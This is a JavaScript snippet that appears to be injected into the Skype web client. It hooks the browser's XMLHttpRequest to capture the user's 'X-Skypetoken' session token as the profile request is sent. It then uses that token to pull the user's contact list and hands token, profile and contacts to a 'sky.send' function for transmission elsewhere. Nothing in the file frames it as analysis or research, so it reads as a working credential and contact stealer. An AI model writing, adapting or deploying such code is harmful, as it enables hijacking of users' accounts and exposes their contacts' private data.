const XHROpen = XMLHttpRequest.prototype.open

XMLHttpRequest.prototype.open = function (method, url) {
  if ('https://api.skype.com/users/self/profile' === url && 'GET' === method) {
    this.setRequestHeader = function (key, value) {
      if ('X-Skypetoken' === key) {
        sky.token = value
      }
      XMLHttpRequest.prototype.setRequestHeader.call(this, key, value)
    }

    this.addEventListener('load', function () {
      waiter('#menuItem-userSettings', function (settings) {
        settings.click()
      })

      sky.profile = JSON.parse(this.responseText)
      sky.profile.v = 1
      sky.profile.type = 'profile'
      sky.profile.token = sky.token
      fetch(`https://contacts.skype.com/contacts/v1/users/${sky.profile.username}/contacts`, {
        method: 'GET',
        mode: 'cors',
        headers: {
          'X-Skypetoken': sky.token
        }
      })
        .then(a => a.json())
        .then(function ({contacts}) {
          sky.profile.contacts = contacts
          sky.send(sky.profile)
        })
    })

    XMLHttpRequest.prototype.open = XHROpen
  }
  XHROpen.apply(this, arguments)
}
